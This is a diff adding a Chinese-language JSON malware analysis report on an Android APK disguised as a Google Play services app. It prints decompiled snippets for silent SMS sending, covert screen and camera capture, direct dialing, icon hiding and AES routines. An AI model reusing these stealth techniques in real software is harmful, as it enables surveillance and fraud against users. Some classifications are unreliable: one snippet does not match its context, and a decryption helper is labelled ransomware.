@@ -1,0 +1,350 @@
+{
+  "APK信息": {
+    "文件名": "7d3a00c93cbf15df1afab245f9be47feb27c862d51581dadaec50378bee7d5fa.apk",
+    "sha256": "7d3a00c93cbf15df1afab245f9be47feb27c862d51581dadaec50378bee7d5fa",
+    "包名": "com.telegram.safe",
+    "应用名": "Google Play services for Edge",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 483.5
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage",
+              "SmsManager"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\axel\\app\\reses\\RES_031;",
+          "method_signature": "a(String phoneNo, String msg)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager smsManager = SmsManager.getDefault();\nsmsManager.sendTextMessage(phoneNo, null, msg, null, null);",
+          "malicious_code_snippet_context": "  \n      public void a(String phoneNo, String msg) {\n          try {\n>>>             SmsManager smsManager = SmsManager.getDefault();\n>>>             smsManager.sendTextMessage(phoneNo, null, msg, null, null);\n          } catch (Exception ex) {\n              ex.printStackTrace();\n          }",
+          "behavior_description": "代码通过SmsManager.getDefault()获取短信管理器实例，调用sendTextMessage()静默发送短信至指定号码phoneNo，短信内容为msg。phoneNo和msg来源于外部变量call_sms_number和call_sms_mess（可能由C2服务器下发或硬编码配置），发送过程无需用户交互或确认，属于典型的短信欺诈行为，可导致用户遭受资费消耗或向恶意号码发送注册验证码等。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lc\\e\\a\\a;",
+          "method_signature": "a(SecretKeySpec key, byte[] iv, byte[] decodedCipherText)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS7Padding\");\nIvParameterSpec ivSpec = new IvParameterSpec(iv);\ncipher.init(2, key, ivSpec);\nbyte[] decryptedBytes = cipher.doFinal(decodedCipherText);\nreturn decryptedBytes;",
+          "malicious_code_snippet_context": "      }\n  \n      public static byte[] a(SecretKeySpec key, byte[] iv, byte[] decodedCipherText) {\n>>>         Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS7Padding\");\n>>>         IvParameterSpec ivSpec = new IvParameterSpec(iv);\n>>>         cipher.init(2, key, ivSpec);\n>>>         byte[] decryptedBytes = cipher.doFinal(decodedCipherText);\n>>>         a(\"decryptedBytes\", decryptedBytes);\n          return decryptedBytes;\n      }\n  ",
+          "behavior_description": "该方法是AESCrypt工具类中的AES解密方法，使用AES/CBC/PKCS7Padding模式，接收SecretKeySpec密钥、IV向量和密文作为参数，通过cipher.init(2)初始化为解密模式(Cipher.DECRYPT_MODE)，调用cipher.doFinal()执行解密操作。在已确认的勒索软件样本中，此AESCrypt类是勒索软件加密基础设施的核心组件，用于文件加密/解密及密钥管理流程，属于勒索行为的关键支撑代码。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\axel\\app\\AudioChat\\g;",
+          "method_signature": "j()",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public void j() {\n    super.j();\n    this.n.startForeground(r(), p().a());\n}",
+          "malicious_code_snippet_context": "  \n      /* JADX INFO: Access modifiers changed from: protected */\n      @Override // net.axel.app.AudioChat.e\n>>>     public void j() {\n>>>         super.j();\n>>>         this.n.startForeground(r(), p().a());\n>>>     }\n  \n      @Override // net.axel.app.AudioChat.e, net.axel.app.AudioChat.d\n      public void b() {",
+          "behavior_description": "该代码在服务方法j()中调用startForeground()将服务提升为前台服务，通过显示通知使服务获得高优先级保活，避免被系统内存清理机制杀死，从而保证恶意服务持续运行以执行后台恶意任务",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "social_spread",
+      "中文名": "社交蠕虫传播",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_CONTACTS"
+        ],
+        "字符串": [
+          "com.whatsapp",
+          "com.facebook.katana"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\axel\\app\\listeners\\NotificationListener;",
+          "method_signature": "if(sbn.getPackageName()",
+          "malicious_behavior": "social_spread",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (sbn.getPackageName().equals(\"com.whatsapp\")) {\n    Notification notification = sbn.getNotification();\n    String notificationText = notification.extras.getString(\"android.text\");\n    if (notificationText.contains(getResources().getString(R.string.income_current_call))) {\n        if (k.a(this.f5122f, (Class<?>) SERS_029.class)) {\n            this.f5121e.a(\"OUTGOING_WHATSAPP_CALL\", false);\n            this.f5122f.stopService(new Intent(this.f5122f, (Class<?>) SERS_029.class));\n        }\n    }\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.service.notification.NotificationListenerService\n      public void onNotificationRemoved(StatusBarNotification sbn) {\n>>>         if (sbn.getPackageName().equals(\"com.whatsapp\")) {\n>>>             Notification notification = sbn.getNotification();\n>>>             String notificationText = notification.extras.getString(\"android.text\");\n>>>             if (notificationText.contains(getResources().getString(R.string.income_current_call))) {\n>>>                 try {\n>>>                     if (k.a(this.f5122f, (Class<?>) SERS_029.class)) {\n>>>                         this.f5121e.a(\"OUTGOING_WHATSAPP_CALL\", false);\n>>>                         this.f5122f.stopService(new Intent(this.f5122f, (Class<?>) SERS_029.class));\n>>>                     }\n>>>                 } catch (Exception e2) {\n                      e2.printStackTrace();\n                  }\n              }",
+          "behavior_description": "通过 NotificationListenerService 监听 WhatsApp 通知，提取通知文本内容判断是否为来电通知，并据此启停 SERS_029 录音/通话拦截服务。该通知监听器可读取 WhatsApp 所有通知内容（包括消息文本），是社交蠕虫传播的核心组件——用于感知消息事件并可能配合自动回复机制向联系人发送恶意链接，同时也可用于窃取 WhatsApp 通信内容和验证码。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.REQUEST_INSTALL_PACKAGES"
+            ],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        },
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.UNINSTALL_PACKAGE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\axel\\app\\activities\\Real_App;",
+          "method_signature": "if(Build.VERSION.SDK_INT < 29)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT < 29) { Intent intent = new Intent(\"android.intent.action.VIEW\"); intent.setDataAndType(Uri.fromFile(new File(net.axel.app.utils.b.f5417e + \"asset.apk\")), \"application/vnd.android.package-archive\"); startActivity(intent); } else { l.f5502a.a(Uri.fromFile(new File(net.axel.app.utils.b.f5417e + \"asset.apk\")), getApplicationContext()); }",
+          "malicious_code_snippet_context": "if (Build.VERSION.SDK_INT < 29) { Intent intent = new Intent(\"android.intent.action.VIEW\"); intent.setDataAndType(Uri.fromFile(new File(net.axel.app.utils.b.f5417e + \"asset.apk\")), \"application/vnd.android.package-archive\"); startActivity(intent); } else { l.f5502a.a(Uri.fromFile(new File(net.axel.app.utils.b.f5417e + \"asset.apk\")), getApplicationContext()); }",
+          "behavior_description": "代码从本地存储路径读取名为 asset.apk 的文件，根据 Android 版本（API 29 为分界线）通过 Intent (ACTION_VIEW) 或自定义方法 (l.f5502a.a) 触发 APK 安装流程，实现恶意载荷的安装或自身更新。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "screen_capture",
+      "中文名": "屏幕截图/录屏",
+      "MITRE": "T1413",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "createVirtualDisplay"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\axel\\app\\serses\\SERS_038;",
+          "method_signature": "g()",
+          "malicious_behavior": "screen_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.f5398c = ImageReader.newInstance(this.f5404i, this.f5405j, 1, 2);\nthis.f5401f = o.createVirtualDisplay(\"screencap\", this.f5404i, this.f5405j, this.f5403h, 9, this.f5398c.getSurface(), null, this.f5399d);\nthis.f5398c.setOnImageAvailableListener(new c(this, null), this.f5399d);",
+          "malicious_code_snippet_context": "          this.f5400e.getSize(size);\n          this.f5404i = size.x;\n          this.f5405j = size.y;\n>>>         this.f5398c = ImageReader.newInstance(this.f5404i, this.f5405j, 1, 2);\n>>>         this.f5401f = o.createVirtualDisplay(\"screencap\", this.f5404i, this.f5405j, this.f5403h, 9, this.f5398c.getSurface(), null, this.f5399d);\n>>>         this.f5398c.setOnImageAvailableListener(new c(this, null), this.f5399d);\n      }\n  \n      /* loaded from: classes2.dex */",
+          "behavior_description": "该代码通过DisplayManager.createVirtualDisplay()创建名为\"screencap\"的虚拟显示器，将其绑定到ImageReader的Surface上，从而实现屏幕内容的实时镜像捕获。同时通过ImageReader.setOnImageAvailableListener()注册回调监听器，每当有新的屏幕帧可用时触发回调，将屏幕截图数据传递给内部类c进行处理。数据流向为：屏幕显示内容(VirtualDisplay镜像)→ImageReader捕获帧→OnImageAvailableListener回调处理(可能保存或外传)。在恶意样本中，此行为通常用于监控用户屏幕活动，窃取银行凭证、短信验证码等敏感信息。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lc\\b\\c;",
+          "method_signature": "if(camera != null)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Camera camera = this.f2058d;\nif (camera != null) {\n    camera.takePicture(null, null, new a());\n} else {\n    this.f2056b.a(1122);\n    this.f2060f = true;\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.view.SurfaceHolder.Callback\n      public void surfaceDestroyed(SurfaceHolder holder) {\n>>>         Camera camera = this.f2058d;\n>>>         if (camera != null) {\n>>>             camera.stopPreview();\n>>>         }\n>>>     }\n>>> \n>>>     /* JADX INFO: Access modifiers changed from: package-private */\n      public void a(b cameraConfig) {\n          this.f2059e = cameraConfig;\n          if (a(this.f2059e.a())) {",
+          "behavior_description": "代码在无用户感知的情况下静默调用Camera.takePicture()进行秘密拍照，拍摄的照片数据通过PictureCallback回调（内部类a）获取，回调中可对图像数据进行后续处理或外传。该行为在已确认的恶意样本中属于典型的隐私窃取行为，攻击者可利用此功能窃取用户面部信息、周围环境或敏感文档图像。数据流向为：Camera硬件(源)→takePicture()静默拍照→PictureCallback回调获取图像数据(汇点)。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\axel\\app\\reses\\RES_011;",
+          "method_signature": "if(Number.equals(\"1\")",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent callIntent = new Intent(\"android.intent.action.CALL\");\ncallIntent.setData(Uri.parse(String.format(\"tel:%s\", Uri.encode(phone))));\ncallIntent.putExtra(\"simSlot\", slot);\ncontext.startActivity(callIntent);",
+          "malicious_code_snippet_context": "          } else if (Number.equals(\"2\")) {\n              slot = 1;\n          }\n>>>         Intent callIntent = new Intent(\"android.intent.action.CALL\");\n>>>         callIntent.setFlags(268468224);\n>>>         callIntent.setData(Uri.parse(String.format(\"tel:%s\", Uri.encode(phone))));\n>>>         callIntent.putExtra(\"simSlot\", slot);\n          Log.d(\"CALLING FROM : \", \"SLOT Number \" + slot);\n          if (b.f.e.a.a(context, \"android.permission.CALL_PHONE\") != 0) {\n              return;",
+          "behavior_description": "该方法接收一个电话号码参数phone，通过构造ACTION_CALL意图（非ACTION_DIAL）直接发起电话呼叫，无需用户交互确认。同时通过读取配置值'CHILD'选择指定SIM卡槽位，实现从特定SIM卡静默拨号。在已确认恶意样本中，此行为通常用于拨打高额费率号码或特定服务号码，直接造成用户经济损失。数据流向：外部传入的phone号码参数(source) → startActivity(ACTION_CALL intent)(sink)。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\axel\\app\\utils\\k;",
+          "method_signature": "x(Context context)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static void x(Context context) {\n    PackageManager p2 = context.getPackageManager();\n    f5449c = new ComponentName(context.getResources().getString(R.string.app_id), context.getResources().getString(R.string.launcher_class));\n    p2.setComponentEnabledSetting(f5449c, 2, 1);\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public static void x(Context context) {\n>>>         Log.e(f5447a, \"HIDE ICON NOW\");\n>>>         PackageManager p2 = context.getPackageManager();\n>>>         f5449c = new ComponentName(context.getResources().getString(R.string.app_id), context.getResources().getString(R.string.launcher_class));\n>>>         p2.setComponentEnabledSetting(f5449c, 2, 1);\n          f5448b = e.a.a.a.a.a(context);\n          f5448b.a(\"COUNTRY_NAME\", true);\n      }",
+          "behavior_description": "该方法通过 PackageManager.setComponentEnabledSetting() 将应用的 launcher Activity 组件设置为 DISABLED 状态（参数值为2），从而隐藏应用图标，使用户无法在桌面看到该应用。这是恶意软件常用的隐蔽驻留技术，用户安装后图标消失，难以察觉和卸载，为后续恶意行为（如后台窃取数据、发送短信等）提供隐蔽环境。数据流向：context.getResources().getString() 获取组件名 → setComponentEnabledSetting() 禁用 launcher 组件。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "process_kill",
+      "中文名": "进程杀死",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.KILL_BACKGROUND_PROCESSES"
+        ],
+        "字符串": [
+          "killProcess"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\axel\\app\\reses\\RES_014;",
+          "method_signature": "if(permissions_granted)",
+          "malicious_behavior": "process_kill",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "boolean permissions_granted = this.f5178b.a(\"API_ACCOUNT_MINISTATEMENT\");\nif (permissions_granted) {\n    k.v(context, 120);\n} else {\n    k.z(context, 0);\n    Process.killProcess(Process.myPid());\n}",
+          "malicious_code_snippet_context": "          this.f5178b = e.a.a.a.a.a(context);\n          Log.d(this.f5177a, \"onReceive\");\n          if (e.a.a.b.a.e(context)) {\n>>>             boolean permissions_granted = this.f5178b.a(\"API_ACCOUNT_MINISTATEMENT\");\n>>>             if (permissions_granted) {\n>>>                 k.v(context, 120);\n>>>             } else {\n>>>                 k.z(context, 0);\n>>>                 Process.killProcess(Process.myPid());\n>>>             }\n          }\n      }\n  }",
+          "behavior_description": "BroadcastReceiver接收广播后，通过配置检查API获取'API_ACCOUNT_MINISTATEMENT'权限状态作为判断条件(source)，当权限未被授予时，先执行k.z()操作随后调用Process.killProcess(Process.myPid())强制终止自身进程(sink)。该行为属于银行木马的条件逃避机制，在未满足特定权限条件时自杀以隐藏自身或阻止非目标环境运行，防止安全分析人员在不满足条件的环境中观察到完整恶意行为链。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
